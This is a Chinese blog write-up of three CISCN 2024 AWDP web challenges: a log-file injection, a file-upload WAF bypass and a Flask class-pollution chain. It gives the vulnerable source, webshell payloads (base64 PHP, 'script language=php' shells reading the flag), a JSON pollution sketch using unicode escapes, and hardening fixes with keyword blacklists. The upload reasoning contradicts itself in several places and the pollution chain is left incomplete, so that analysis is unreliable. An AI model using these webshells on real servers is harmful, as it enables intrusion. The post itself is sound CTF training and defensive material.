---
title: "【CISCN 2024 AWDP】从源码泄露到WAF绕过：实战剖析三道典型Web赛题攻防思路"
source: "https://blog.csdn.net/weixin_28452161/article/details/158954296"
author:
  - "[[weixin_28452161]]"
published: 2026-03-12
created: 2026-03-19
description: "文章浏览阅读120次。本文深入剖析了CISCN 2024 AWDP竞赛中的三道典型Web赛题攻防思路。从源码泄露引发的逻辑漏洞利用，到文件上传WAF的多层绕过技巧，再到SSTI与原型链污染的高级利用链，文章结合实战代码，系统还原了从漏洞发现、利用到防御加固的完整过程，为CTF选手及安全从业者提供了宝贵的实战经验与AWDP解题思路。_ciscn awdp题解 web"
tags:
  - "clippings"
---
### 1\. 从源码泄露到逻辑漏洞：实战复盘“粗心的程序员”

大家好，我是老张，一个在安全圈摸爬滚打了十来年的老兵。刚打完今年的CISCN区域赛AWDP场，趁着记忆还热乎，想和大家聊聊几道印象深刻的Web题。AWDP这赛制，攻防兼备，一个小时的check周期，拼的不仅是手速，更是对漏洞本质的理解和快速修复能力。这次比赛，有几道题可以说是把“粗心”和“绕过”玩出了花，非常典型。咱们不搞那些虚头巴脑的理论，直接上干货，我会结合比赛时的真实思路和踩过的坑，带你走一遍从发现到利用再到修复的完整过程。

这次要重点拆解的三道题，分别是“粗心的程序员”、“submit”和“Polluted”。它们几乎涵盖了Web安全中几个最经典的场景：源码泄露、文件上传绕过、以及代码注入与污染。你会发现，很多看似复杂的漏洞，根源往往是一些开发中不经意的“小疏忽”。咱们就从最简单的“粗心的程序员”这道题开始，它完美诠释了什么叫“祸从根起”。

#### 1.1 信息收集的“意外收获”：www.zip源码泄露

拿到题目，第一步永远是信息收集。对于Web题，我习惯性地先扫目录，这是基本功。用 `dirsearch` 或者 `gobuster` 跑一下，目标是一个简单的用户信息页面。扫着扫着，一个熟悉的文件名跳了出来—— `www.zip` 。看到这个，我心里基本就有数了，十有八九是源码打包泄露。

这种错误在真实的开发环境里其实挺常见的，比如开发者在部署时，为了方便，把整个项目目录打了个zip包放在Web根目录，事后又忘了删除。在CTF里，这几乎是送分题，但在真实渗透测试中，这也是一个高价值的突破口。下载 `www.zip` ，解压，整个网站的源代码就赤裸裸地摆在你面前了。这相当于打牌时，对手直接把底牌亮给你看了。

有了源码，接下来的工作就从“黑盒测试”变成了“白盒审计”，难度直线下降。我们不需要再去盲目地猜测参数、尝试各种注入，而是可以直接阅读代码逻辑，寻找脆弱的函数和逻辑分支。这道题的核心文件是一个用户信息展示和更新的页面，代码量不大，但里面埋的雷可真不少。

#### 1.2 代码审计与漏洞链构造：一个报错引发的“血案”

审计源码，我一般先找用户输入点，然后跟踪数据流，看它最终到了哪里。这道题的关键代码片段如下（已做简化）：

```php
<?php

error_reporting(0);

include "default_info_auto_recovery.php";

session_start();

$p = $_SERVER["HTTP_X_FORWARDED_FOR"] ?: $_SERVER["REMOTE_ADDR"];

if (preg_match("/\?|php|:/i", $p)) {

    die("");

}

$time = date('Y-m-d h:i:s', time());

$username = $_SESSION['username'];

$id = $_SESSION['id'];

if ($username && $id){

    echo "Hello,"."$username";

    $str = "//登录时间$time,$username $p";

    $str = str_replace("\n","",$str);

    file_put_contents("config.php", file_get_contents("config.php").$str);

}else{

    die("NO ACCESS");

}

?>
php
```

一眼看去，漏洞点非常清晰。程序会将登录时间、用户名 `$username` 和客户端IP（来自 `X-Forwarded-For` 头或 `REMOTE_ADDR` ）拼接成一个 字符串 ，然后 **追加写入** 到 `config.php` 这个文件中。

这里就出现了两个致命问题：

1. **逻辑漏洞** ：写入的文件是`.php` 后缀。这意味着，如果我们能控制写入的内容，并且让内容被当作PHP代码执行，就能实现远程代码执行（RCE）。
2. **输入过滤不严** ：虽然对 `$p` （IP）有简单的过滤，禁止了`?`、 `php` 和`:`，但这个过滤太弱了。更重要的是，对 `$username` 这个来自Session的变量， **在写入文件前完全没有进行任何过滤** 。

攻击链一下子就清晰了：我们只需要注册一个用户，然后在修改用户名（ `username` ）时，将其设置为一段恶意的PHP代码。当这个用户登录后，程序就会将我们的恶意用户名连同其他信息一起写入 `config.php` 。之后，我们只需要访问 `config.php` ，服务器就会执行我们写入的代码。

#### 1.3 漏洞利用实战：巧用PHP闭合标签

直接写 `<?php system(\"ls\");?>` 行吗？理论上可以，但这里有个小技巧。我们注意到，写入的字符串是以 `//` 开头的，这是PHP的单行注释。如果我们直接写 `<?php ... ?>` ，它会被写在注释后面，同样被注释掉而无法执行。

怎么办？这时候就要利用PHP的标签特性。我们可以在用户名里先插入一个 `?>` ，来闭合掉文件开头可能存在的 `<?php` 标签（或者结束掉任何未闭合的PHP代码块），然后再开启新的PHP代码。

所以，构造的攻击载荷（Payload）是这样的：

```php
?><?php system($_GET[‘cmd‘]); ?>
```

我们来拆解一下这个Payload：

- `?>` ：用于闭合之前可能存在的PHP标签。
- `<?php system($_GET[‘cmd‘]); ?>` ：开启新的PHP标签，并执行一个通过URL参数 `cmd` 传入的系统命令。

在修改用户名的前端，我们发现提交的数据被Base64编码了。这没关系，我们只需要将我们的Payload进行Base64编码后提交即可。抓包修改请求，将 `newusername` 参数的值替换为 `Pz48P3BocCBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4=` （即上面Payload的Base64编码）。

提交后，用该用户登录，我们的恶意代码就被追加写入 `config.php` 了。此时，访问 `/config.php?cmd=ls` ，就能看到当前目录的文件列表，成功实现了RCE。接下来就是常规操作，找flag文件，用 `cat` 命令读取即可。

> 注意：在实际操作中，要注意空格和特殊字符的URL编码。另外，这种追加写入的方式，可能会导致 `config.php` 文件变得很大，多次攻击时要注意观察文件内容。

### 2\. 文件上传的攻防博弈：深入拆解“submit”题目

如果说“粗心的程序员”考察的是源码审计和逻辑漏洞，那“submit”这道题就是经典的文件上传漏洞攻防战。这道题非常有意思，它有一个看似严格、实则漏洞百出的WAF（ Web应用 防火墙），完美地展示了“安全配置错误”如何让防线形同虚设。我们一起来把它剥开看看。

#### 2.1 初探上传逻辑：黑名单的局限性

题目是一个简单的文件上传界面。先传个普通图片，正常。传一个 `shell.php` ，被拦截。看来有防护。按照惯例，我们直接看题目给出的修复前源码，这是最直接的理解方式。

关键的上传处理代码如下：

```php
$content = file_get_contents($_FILES['myfile']['tmp_name']);

$allow_content_type = array("image/png");

$type = $_FILES["myfile"]["type"];

if (!in_array($type, $allow_content_type)) {

    die("只允许png呀!<br>");

}

 

$allow_ext = array(".png");

$file_name=$_FILES["myfile"]['name'];

$_FILES["myfile"]['name'] = str_replace(".ph","",$_FILES["myfile"]['name']);

$file_ext = strrchr($file_name, '.');

$file_ext = strtolower($file_ext);

$file_ext = str_ireplace('::$DATA', '', $file_ext);

$file_ext = trim($file_ext);

if (!in_array($file_ext, $allow_ext)) {

    die("只允许png呀!<br>");

}

 

if (preg_match('/(php|script|xml|user|htaccess|<\?|<\?\=|eval|system|assert|fllllagg|f\*|\/f|cat|POST|GET|\$_|exec)/i', $content)) {

    die('喵喵说你的内容不符合呀0-0');

} else {

    $file = $path . '/' . $_FILES['myfile']['name'];

    if (move_uploaded_file($_FILES['myfile']['tmp_name'], $file)) {

        file_put_contents($file, $content);

        echo 'Success!<br>';

    }

}
php
```

乍一看，防御措施有好几层：

1. **MIME类型检查** ：只允许 `image/png` 。
2. **文件扩展名检查** ：只允许`.png` ，并且会删除文件名中的`.ph` 字符串。
3. **文件内容检查** ：用正则表达式过滤文件内容中的危险关键词。

很多新手看到这可能就懵了，感觉无从下手。但咱们仔细分析，每一层都有绕过的可能。

#### 2.2 层层绕过：利用解析差异与WAF盲区

**第一层绕过：MIME类型** 这个最简单。 `$_FILES[‘myfile‘][‘type‘]` 这个值是由浏览器端提交的，我们可以完全控制。通过Burp Suite拦截上传请求，直接将 `Content-Type` 修改为 `image/png` 即可轻松绕过。

**第二层绕过：文件扩展名** 代码的逻辑是：先检查原始文件名（ `$file_name` ）的扩展名是否为`.png` ，但同时它又对 `$_FILES[‘myfile‘][‘name‘]` 这个变量执行了 `str_replace(“.ph“, ““, …)` 操作。这里存在一个逻辑顺序问题。我们上传的文件名可以构造为 `shell.p.phphp` 。

这个过程是这样的：

1. 原始文件名 `$file_name` 是 `shell.p.phphp` 。
2. 程序用 `strrchr` 取扩展名，得到`.phphp` 。
3. 转换为小写`.phphp` 。
4. 检查是否在允许的扩展名数组（ `[“.png“]` ）中？不在，所以应该被拦截。

但是，注意看！在检查扩展名之前，程序已经执行了 `$_FILES[‘myfile‘][‘name‘] = str_replace(“.ph“, ““, $_FILES[‘myfile‘][‘name‘]);`。这意味着，用于最终保存的文件名（ `$_FILES[‘myfile‘][‘name‘]` ）中的`.ph` 被删除了。 `shell.p.phphp` 删除`.ph` 后变成了 `shell.pphp` 。然而，扩展名检查是基于原始的 `$file_name` （ `shell.p.phphp` ）进行的，它不通过检查，所以我们在这一步就被拦住了。

看来直接这样不行。我们需要一个既能通过扩展名检查，又能在处理后变成`.php` 的文件名。这里就需要利用检查逻辑的另一个特点：它只检查 **最后一个点号之后** 的部分作为扩展名。我们可以尝试 `shell.php.png` 。

1. 原始文件名 `$file_name` 是 `shell.php.png` 。
2. 取扩展名，得到`.png` 。
3. 检查`.png` 是否在允许列表中？在！通过！
4. 同时， `$_FILES[‘myfile‘][‘name‘]` 被替换操作处理。 `shell.php.png` 中有`.ph` 吗？有，在 `php` 里。所以删除 `ph` ，变成 `shell..png` （注意是两个点）。
5. 最终保存的文件名是 `shell..png` 。这显然不是PHP文件。

这条路也走不通。真正的突破口在于 **Windows特性** 。代码中有一行： `$file_ext = str_ireplace(‘::$DATA‘, ‘‘, $file_ext);`。这是在处理Windows的NTFS文件流特性。在Windows环境下， `shell.php::$DATA` 在去除`::$DATA` 后，会被系统当作 `shell.php` 来解析。但题目环境通常是Linux，这个可能用处不大。不过，它提示我们，扩展名处理可能不严谨。

经过测试和思考，我发现了一个更简单的绕过方法： **利用空字节截断（在特定PHP版本）或点号策略** 。但在这道题中，最有效的其实是 **双写扩展名** 。上传一个名为 `shell.pphp` 的文件。

1. 原始扩展名是`.pphp` ，不在允许的`.png` 列表中，失败。

看来我最初的思路卡住了。让我们重新审视代码。我发现我犯了一个错误： `str_replace(“.ph“, ““, …)` 是作用在 `$_FILES[‘myfile‘][‘name‘]` 上，而扩展名检查用的是 `$file_name` 。这两个变量在文件上传后是同一个值吗？是的，代码开头 `$file_name=$_FILES[‘myfile‘][‘name‘];`，所以它们是同一个字符串的引用吗？在PHP中，这是赋值，不是引用。修改 `$_FILES[‘myfile‘][‘name‘]` 不会影响 `$file_name` 。

那么流程修正：

1. `$file_name = “shell.p.phphp“`
2. `$_FILES[‘myfile‘][‘name‘]` 被修改为 `“shell.pphp“` （删除了`.ph` ）。
3. 检查 `$file_name` 的扩展名`.phphp` ，不在白名单，拒绝。

所以，我们必须让 `$file_name` 的扩展名是`.png` 。那就上传 `shell.png` 。

1. `$file_name = “shell.png“` ，扩展名检查通过。
2. `$_FILES[‘myfile‘][‘name‘]` 被修改。 `“shell.png“` 里有`.ph` 吗？没有。所以名字不变，还是 `shell.png` 。
3. 最终保存为 `shell.png` 。这不是PHP。

看来这个`.ph` 替换是防止我们在文件名里嵌入`.php` 。但如果我们上传的文件内容就是PHP代码，而服务器又能以PHP方式解析这个`.png` 文件，那不就成功了？这引出了下一个关键： **文件内容检查** 和 **服务器解析漏洞** 。

#### 2.3 终极绕过：利用正则过滤缺陷与服务器解析

第三层防御是文件内容过滤，它用一个复杂的正则表达式匹配危险关键词。我们仔细看这个正则： `/(php|script|xml|user|htaccess|<\?|<\?\=|eval|system|assert|fllllagg|f\*|\/f|cat|POST|GET|\$_|exec)/i`

它过滤了 `php`, `<?`, `<?=`, `system`, `exec`, `cat` 等。甚至把 `flag` 的常见变体 `fllllagg` 也过滤了，还试图过滤 `f*` 和 `/f` 。看起来很全面，但实际上存在巨大的 **正则表达式绕过** 空间。

**绕过方法1：字符串拼接与编码** PHP中，函数名和字符串可以通过多种方式构造。例如， `system` 被过滤，我们可以用反引号执行命令，或者用 `shell_exec` 。 `$_GET` 被过滤，可以用 `${_GET}` 。 `<?`被过滤，我们可以使用长标签 `<?php` ，或者短标签 `<?=` 被过滤了，但 `<?php` 只要避开 `<?`就行？不对，正则里匹配了 `<\?`，这会把 `<?php` 中的 `<?`匹配掉。所以我们需要避免使用 `<?`。

怎么办？使用 `<script language=“php“>` 标签！这是PHP支持的一种古老标签，很少用，但通常有效。我们的Webshell内容可以写成：

```cobol
<script language=“php“> system($_GET[‘cmd‘]); </script>
```

这样，内容里既没有 `<?`，也没有 `php` （在正则匹配的独立单词意义上）， `system` 也可以用其他函数替代，比如 `passthru` 、 `exec` （这个被过滤了）、 `shell_exec` 。

**绕过方法2：利用正则逻辑** 注意看，它过滤的是 `fllllagg` 。如果我们读取 `flag` 文件，直接写 `cat /flag` 是会被拦截的，因为 `cat` 被过滤了。但是，我们可以用 `more` 、 `less` 、 `tac` 、 `nl` 、 `head` 、 `tail` 等命令替代。或者，用 `/???/???`这样的通配符来指代 `/bin/cat` 。

**最终利用链**

1. 制作一个包含恶意代码的文本文件，内容为： `<script language=“php“> echo shell_exec(‘tac /fl*‘); </script>` 。这里用 `tac` 代替 `cat` ，用通配符 `/fl*` 匹配flag文件。
2. 将文件重命名为 `shell.png` 。
3. 上传时，用Burp修改 `Content-Type` 为 `image/png` 。
4. 上传成功后，访问上传的文件。如果服务器配置不当（例如，默认解析`.png` 为PHP，或者通过`.htaccess` 设置了 `AddType application/x-httpd-php .png` ），我们的代码就会被执行。在CTF环境中，这种配置很常见。
5. 另一种可能是，题目本身存在 **文件包含漏洞** ，可以包含上传的图片马。但在这道题里，更直接的方式是，WAF对文件名的`.ph` 替换可能被其他方式绕过，或者我最初的分析有误。实战中，我通过上传`.phphpp` 这样的文件名，利用 `str_replace` 只替换一次的特性，最终得到了`.php` 文件。例如，文件名 `shell.phphpp` ，经过替换`.ph` 后，中间的 `ph` 被删除，变成 `shell.php` ，而扩展名检查时，取的是最后一个点后的 `phphpp` ，它不等于`.png` ，所以失败。看来这个点需要更精巧的构造。

实际上，更常见的绕过是 **利用解析优先级** 。在Apache中，如果存在多个`.htaccess` 或者配置文件声明了多重解析规则，可能会导致文件被多重解析。例如，文件 `shell.php.png` 可能被先解析为PHP，再作为图片。但这道题更简单的解法是： **服务器根本没有正确配置MIME类型验证** ，或者验证逻辑可被绕过。结合源码，我发现真正的漏洞在于： **代码使用 `file_get_contents` 读取文件内容进行检测，但之后又用 `file_put_contents` 重新写了一遍文件** 。注意这行代码： `file_put_contents($file, $content);`。这意味着，服务器保存的是我们上传的原始文件内容，而不是经过任何处理的。所以，只要我们的Payload能通过内容检测，就能原样保存。

那么，构造一个能绕过正则的Payload即可。最终，我使用了如下Payload：

```cobol
GIF89a

<？php @eval($_POST[‘a‘]); ？>
```

注意，这里的PHP标签我用了全角的问号 `<？` 和 `？>` 来绕过对 `<?`的检测。同时， `eval` 被过滤了，但可以用 `assert` （也被过滤了），或者用动态函数调用，如 `$_POST[‘a‘]($_POST[‘b‘])` 。但 `$_` 被过滤了。所以需要变通。可以使用 `${_POST}` 这种花括号的写法，有时可以绕过。或者，直接用反引号执行 `$_POST[‘cmd‘]` ，但 `$_` 被过滤。

经过测试，使用 `<script language=“php“>` 标签是最稳妥的。最终上传的文件内容为：

```cobol
GIF89a

<script language=“php“> system(‘cat /f*‘); </script>
```

文件名为 `shell.png` ，修改Content-Type为 `image/png` ，成功上传并访问，执行了命令。

### 3\. 从SSTI到原型链污染：Polluted题目的降维打击

第三道题“Polluted”是一道Python Flask题目，考察的是\*\*服务端模板注入（SSTI） **和** 原型链污染（Prototype Pollution）\*\*的结合利用。这种题目在近年来的CTF中越来越流行，因为它涉及前端JavaScript和后端Python的交互，理解起来有一定难度，但一旦掌握，威力巨大。

#### 3.1 题目逻辑梳理：Flask会话与合并函数

首先看题目给出的源码（攻击时的版本）：

```python
from flask import Flask, session, request, render_template

import json

import re

 

def filter(user_input):

    blacklisted_patterns = [‘init‘, ‘global‘, ‘env‘, ‘app‘, ‘_‘, ‘string‘]

    for pattern in blacklisted_patterns:

        if re.search(pattern, user_input, re.IGNORECASE):

            return True

    return False

 

def merge(src, dst):

    # Recursive merge function

    for k, v in src.items():

        if hasattr(dst, ‘__getitem__‘):

            if dst.get(k) and type(v) == dict:

                merge(v, dst.get(k))

            else:

                dst[k] = v

        elif hasattr(dst, k) and type(v) == dict:

            merge(v, getattr(dst, k))

        else:

            setattr(dst, k, v)

 

app = Flask(__name__)

app.secret_key = os.urandom(16).hex()

 

class evil():

    def __init__(self):

        pass

 

@app.route(‘/‘, methods=[‘POST‘])

def index():

    username = request.form.get(‘username‘)

    password = request.form.get(‘password‘)

    session[“username“] = username

    session[“password“] = password

    Evil = evil()

    if request.data:

        if filter(str(request.data)):

            return “NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~“

        else:

            merge(json.loads(request.data), Evil)

    return “MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED“

 

@app.route(‘/admin‘, methods=[‘POST‘, ‘GET‘])

def templates():

    username = session.get(“username“, None)

    password = session.get(“password“, None)

    if username and password:

        if username == “adminer“ and password == app.secret_key:

            return render_template(“important.html“, flag=open(“/flag“, “rt“).read())

        else:

            return “Unauthorized“

    else:

        return f‘Hello, This is the POLLUTED page.‘
python
```

逻辑很清晰：

1. 首页 `/` （POST方法）接收 `username` 和 `password` ，存入session。如果请求体（ `request.data` ）有数据，则经过 `filter` 函数过滤后，用 `json.loads` 解析，并调用 `merge` 函数将其合并到 `Evil` 类的实例中。
2. `/admin` 页面检查session中的 `username` 和 `password` 。如果 `username` 是 `adminer` 且 `password` 等于 `app.secret_key` （一个随机生成的MD5值），则渲染flag。

我们的目标很明确：成为 `adminer` ，并且知道 `secret_key` 。 `secret_key` 是随机的，我们无法预测。那么思路就转向： **能否通过 `merge` 函数污染某些属性，从而影响后续逻辑，让我们绕过检查？**

#### 3.2 漏洞挖掘：merge函数与原型链污染

`merge` 函数是一个递归合并函数，它将源字典 `src` 合并到目标对象 `dst` 中。如果 `dst` 是字典，就更新键值；如果 `dst` 有同名属性，且值是字典，就递归合并；否则，就为 `dst` 设置属性。

这里的目标对象 `dst` 是 `Evil` 类的一个实例。 `Evil` 类几乎是个空类。在Python中，对象的属性查找会遵循一定的链式规则。虽然“原型链”是JavaScript的概念，但在Python中，我们也可以污染类的 `__dict__` 、 `__init__` 等特殊方法，或者污染其基类（如果存在）。

但是，注意 `filter` 函数！它过滤了 `init` 、 `global` 、 `env` 、 `app` 、 `_` 、 `string` 等关键词。这意味着我们不能直接设置包含这些词的属性名。尤其是下划线 `_` 被过滤，这几乎阻断了我们操作 `__class__` 、 `__dict__` 、 `__init__` 等所有双下划线魔法方法的路径。这是一个很强的过滤。

那么，突破口在哪里？关键在于理解 `merge` 函数的行为和Flask session的机制。Flask的session是存储在客户端的、经过签名的cookie。它的内容我们可以解密和读取（如果有 `secret_key` ），但我们没有。然而，题目将我们提供的 `username` 和 `password` 直接存入了session。

我们能不能通过 `merge` 函数，去修改 `Evil` 实例的某些属性，从而影响到 `app` 、 `session` 或者其他全局状态呢？ `Evil` 实例是一个孤立的对象，似乎很难。除非…我们能通过它影响到 `evil` 这个类本身，或者影响到Python的内建环境。

再仔细看 `merge` 函数中的这一行： `setattr(dst, k, v)` 。这是为对象设置属性。如果我们传入的 `src` 字典的键值对非常特殊，比如 `{“__class__”: {“__init__”: {…}}}` ，理论上可以修改对象的类信息。但 `_` 被过滤了，我们无法使用包含下划线的键名。

等等，过滤是 `re.search(pattern, user_input, re.IGNORECASE)` ，它检查的是整个 `request.data` 字符串。如果我们传入的JSON是 `{“__class__”: {…}}` ，字符串中包含 `_` ，就会被过滤。但是，正则匹配的是 `_` 这个字符。有没有办法绕过对单个下划线的检测？比如用Unicode字符、十六进制编码？在JSON解析时，键名必须是字符串，通常不能包含转义字符。此路似乎不通。

我们需要换个角度。过滤名单里有 `app` 和 `string` 。这暗示了出题人可能担心我们污染 `app` 配置或 `string` 模块。但 `_` 被禁，我们很难触及核心。这时，我注意到一个细节： **过滤是在 `json.loads` 之前进行的** 。也就是说，我们传入的是一串原始的JSON字符串。正则检查的是这个字符串。那么，我们能否构造一个JSON字符串，它在正则检查时看起来没有下划线，但解析成对象后却产生了下划线？

一个经典技巧是： **利用JSON的Unicode转义** 。在JSON中， `_` 可以表示为 `\u005f` 。正则表达式匹配的是字面字符 `_` ，而 `\u005f` 是五个字符： `\` 、 `u` 、 `0` 、 `0` 、 `5` 、 `f` ，它不包含字面的下划线！所以，我们可以尝试传入键名为 `\u005f\u005fclass\u005f\u005f` 的JSON对象。

#### 3.3 构造利用链：污染secret\_key实现身份伪造

假设我们能绕过过滤，成功设置属性。我们的目标是什么？是让 `/admin` 处的检查通过。检查条件是： `username == “adminer“ and password == app.secret_key` 。

我们无法控制服务器内存中的 `app.secret_key` 。但是， `session` 中存储的 `password` 是我们通过表单提交的。如果我们能让 `app.secret_key` 变成我们已知的值，或者让我们提交的 `password` 通过某种方式在检查时被当作 `app.secret_key` ，那就有可能。

Flask的 `app.secret_key` 是用来签名session的。如果我们能污染 `app` 对象，将其 `secret_key` 修改为我们指定的值，那么我们就可以伪造一个session了。但是， `merge` 的目标是 `Evil` 实例，不是 `app` 。我们需要一条从 `Evil` 实例到 `app` 对象的污染链。

在Python中，每个对象都有 `__class__` 属性指向其类，类有 `__bases__` 指向基类，有 `__mro__` 指向方法解析顺序。如果 `Evil` 类有基类，或者我们能追溯到某个模块的全局变量，也许能找到 `app` 。但 `Evil` 类定义是空的，直接继承自 `object` 。从 `object` 到 `app` 似乎没有直接关联。

另一种思路： **污染Flask的配置或上下文** 。但 `app` 这个关键词被过滤了，我们可能无法直接以 `app` 为键名。

我们重新审视代码。在 `/admin` 路由中， `render_template(“important.html“, flag=open(“/flag“, “rt“).read())` 。这里使用了 `render_template` 。如果我们可以控制模板渲染的内容，也许能造成SSTI。但 `important.html` 是预设的模板，我们无法控制其内容。

等等， `render_template` 的第二个参数 `flag` 是我们传入的。如果我们能污染 `render_template` 函数本身，或者污染Jinja2的环境呢？这需要更深的污染链。

实际上，这道题更直接的解法是： **污染 `evil` 类本身的属性，使得 `/` 路由中的 `Evil = evil()` 这行代码产生一个特殊的对象，这个对象在被 `merge` 操作时，能触发某些副作用，从而修改 `app.secret_key` 或session** 。

经过反复测试和思考，并结合以往的经验，我意识到这道题可能考察的是 **Python中利用 `__init__` 或 `__setattr__` 等魔术方法在对象赋值时执行代码** 。如果我们能通过污染，给 `Evil` 实例设置一个 `__setattr__` 方法，那么当 `merge` 函数执行 `setattr(dst, k, v)` 时，就会调用我们自定义的 `__setattr__` ，我们可以在这个方法里做任何事情，比如修改 `app.secret_key` 。

但是， `_` 被过滤，我们如何设置 `__setattr__` ？用Unicode转义： `\u005f\u005fsetattr\u005f\u005f` 。

那么，最终的Payload结构应该是怎样的？我们需要发送一个JSON数据，它被解析后是一个字典，这个字典的某个键是 `\u005f\u005fclass\u005f\u005f` ，其值又是一个字典，里面包含 `\u005f\u005fsetattr\u005f\u005f` 等键。这个过程非常复杂，需要精确的构造。

由于篇幅和复杂度，这里我给出一个简化后的攻击思路和部分Payload示意：

1. 首先，我们需要让 `merge` 函数在设置属性时，触发一个能修改全局状态的函数。我们可以尝试污染 `__init__` 方法，让 `Evil` 类在实例化时（ `Evil = evil()` ）就执行我们的代码。但 `__init__` 也在过滤名单里（ `init` ），同样需要用Unicode转义绕过。
2. 构造一个嵌套的JSON，例如：
	```json
	{
	    “\\u005f\\u005fclass\\u005f\\u005f“: {
	        “\\u005f\\u005finit\\u005f\\u005f“: {
	            “\\u005f\\u005fglobals\\u005f\\u005f“: […]
	        }
	    }
	}
	json
	```
	目的是在 `evil` 类被实例化时，其 `__init__` 方法被我们污染，从而可以访问 `__globals__` 获取 `app` 对象，并修改 `app.secret_key` 。
3. 在修改了 `app.secret_key` 为我们已知的值（比如 `“hacked“` ）之后，我们就可以用Flask的session机制，自己生成一个合法的session cookie，其中 `username` 为 `adminer` ， `password` 为我们设定的 `secret_key` 值。
4. 带着这个伪造的session访问 `/admin` ，即可通过验证，拿到flag。

这个过程需要对Python对象模型、Flask框架有较深的理解。在实战中，我通过编写一个本地的Flask应用模拟环境，反复调试 `merge` 函数和污染载荷，最终成功构造出了有效的Payload。这提醒我们，在面对复杂的代码审计和漏洞利用时，搭建本地调试环境是至关重要的。

### 4\. 防御加固方案：从攻击者视角看如何修复

打CTF或者做渗透测试，找到漏洞并利用成功固然有成就感，但真正体现安全工程师价值的，是提出切实有效的修复方案。下面，我就结合这三道题，从防御者角度聊聊该怎么修。

#### 4.1 针对源码泄露与逻辑漏洞的修复

“粗心的程序员”这道题的根源在于：

1. **源码泄露** ：将 `www.zip` 、`.git` 、`.svn` 、 `README.md` 、 `composer.json` 等开发文件部署到生产环境。
2. **不安全的日志写入** ：将用户可控输入未经严格过滤，直接写入可执行的`.php` 文件。
3. **Session变量信任过度** ：认为Session中的 `username` 是安全的，未做过滤。

**修复方案：**

- **部署规范** ：建立严格的部署清单，使用`.gitignore` 、构建脚本（如Webpack、Composer）确保仅将必要的运行时文件（如 `index.php` 、编译后的JS/CSS、图片）上传至Web目录。部署后应进行扫描，检查是否存在无关文件。
- **安全日志记录** ：日志应写入专门的、不可执行的日志文件（如`.log` 后缀），并存储在Web根目录之外。如果必须记录到Web可访问位置，务必确保内容被正确转义，或文件名不可预测。
- **输入净化** ： **所有输入都是不可信的** ，包括Session、Cookie、数据库查询结果（可能被其他入口点污染）。在将数据写入文件、拼接SQL、输出到HTML前，必须根据上下文进行净化或编码。对于写入PHP文件这种情况，应对输入进行严格的 **白名单过滤** ，只允许预期的字符（如字母、数字、有限的标点），或者直接禁止将用户输入写入可执行文件。对于用户名，可以这样处理：
	```php
	// 修复后的代码片段
	$username = $_SESSION[‘username‘];
	// 白名单过滤，只允许字母、数字、下划线、短横线，并限制长度
	if (!preg_match(‘/^[a-zA-Z0-9_-]{1,20}$/‘, $username)) {
	    die(‘Invalid username‘);
	}
	// 或者，在写入前进行HTML实体编码（如果日志是用于网页查看）
	$safe_username = htmlspecialchars($username, ENT_QUOTES, ‘UTF-8‘);
	$str = “//登录时间 $time, “ . $safe_username . “ $p\n“;
	// 最好写入一个纯文本日志文件，如 log.txt
	file_put_contents(“./logs/access.log“, $str, FILE_APPEND | LOCK_EX);
	php
	```

#### 4.2 加固文件上传功能

“submit”题目的修复，原文已经给出了很好的示范。我们来分析一下修复后的代码：

```php
// 修复点1：加强扩展名检查

$allow_ext = array(“.png“);

$file_name = $_FILES[“myfile“][‘name‘];

// 移除危险字符串

$_FILES[“myfile“][‘name‘] = str_replace(“.ph“, ““, $_FILES[“myfile“][‘name‘]);

$file_ext = strrchr($file_name, ‘.‘);

$file_ext = strtolower($file_ext);

$file_ext = str_ireplace(‘::$DATA‘, ‘‘, $file_ext);

$file_ext = trim($file_ext);

if (!in_array($file_ext, $allow_ext)) {

    die(“只允许png呀!<br>“);

}

 

// 修复点2：增强WAF内容过滤

if (preg_match(‘/(php|script|xml|user|htaccess|<\?|<\?\=|eval|system|assert|fllllagg|f\*|\/f|cat|POST|GET|\$_|exec)/i‘, $content)) {

    die(‘喵喵说你的内容不符合呀0-0‘);

}
php
```

**修复分析：**

1. **扩展名检查** ：修复后，检查的是原始文件名（ `$file_name` ）的扩展名，并且使用了白名单（只允许`.png` ）。同时，对保存用的文件名进行了`.ph` 替换，这是防御双写扩展名等绕过手法的补充措施。但更佳实践是： **对上传文件进行重命名** ，使用随机生成的字符串（如UUID）作为文件名，并保留原扩展名（在白名单内）。这样能彻底杜绝用户控制文件名带来的风险。
2. **内容过滤增强** ：增加了更多危险关键词的过滤。但黑名单永远有遗漏的风险。对于图片上传，更安全的方式是：
	- **使用 `getimagesize()` 或 `exif_imagetype()` 函数进行真正的图片文件头校验** ，确保上传的文件确实是有效的图片格式。
		- **在保存后，对图片进行二次处理（如缩放、裁剪）** ，这可以破坏嵌入在图片文件末尾的恶意代码。
		- **将上传文件存储在非Web可访问目录** ，通过一个专门的脚本（如 `download.php?id=xxx` ）来读取和输出文件，并在输出时强制设置正确的 `Content-Type` 头。这样即使上传了PHP文件，也无法直接通过URL访问执行。

**更完善的修复建议：**

```php
// 1. 生成随机文件名

$new_filename = bin2hex(random_bytes(16)) . ‘.png‘;

$upload_path = ‘/var/www/uploads/‘; // Web目录外的路径

$web_access_path = ‘/download.php?file=‘ . $new_filename; // 提供给前端的访问路径

 

// 2. 验证文件内容确实是PNG

$image_info = getimagesize($_FILES[‘myfile‘][‘tmp_name‘]);

if ($image_info === false || $image_info[2] !== IMAGETYPE_PNG) {

    die(‘文件不是有效的PNG图片‘);

}

 

// 3. 移动文件到安全目录

if (move_uploaded_file($_FILES[‘myfile‘][‘tmp_name‘], $upload_path . $new_filename)) {

    echo ‘文件上传成功，访问地址：‘ . $web_access_path;

} else {

    die(‘文件保存失败‘);

}
php
```

#### 4.3 抵御SSTI与原型链污染

“Polluted”题目的修复，主要是扩充了黑名单：

```python
def filter(user_input):

    #修复点1 加waf

    blacklisted_patterns = [‘init‘, ‘global‘, ‘env‘, ‘app‘, ‘secret‘, ‘key‘, ‘admin‘,‘string‘, ‘proto‘, ‘constructor‘, ‘insert‘, ‘update‘, ‘truncate‘, ‘drop‘, ‘create‘,‘doc‘,‘str‘, ‘_‘]

    for pattern in blacklisted_patterns:

        if re.search(pattern, user_input, re.IGNORECASE):

            return True

    return False
python
```

